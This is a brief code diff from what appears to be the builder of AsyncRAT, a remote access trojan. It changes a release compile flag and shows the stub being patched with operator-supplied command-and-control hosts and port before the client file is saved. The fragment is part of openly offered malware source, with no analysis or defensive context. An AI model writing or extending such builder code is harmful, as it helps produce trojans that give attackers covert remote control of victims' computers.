@@ -13,7 +13,7 @@ Public Class Builder
             .FileName = "AsyncRAT-Client"
             }
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                Stub = Replace(Stub, "#Const VS = True", "#Const VS = False")
+                Stub = Replace(Stub, "#Const Release = False", "#Const Release = True")
 
                 Stub = Replace(Stub, "%HOSTS%", TextBox1.Text.Trim().Replace(",", ChrW(34) + "," + ChrW(34)))
                 Stub = Replace(Stub, "%PORT%", TextBox2.Text)
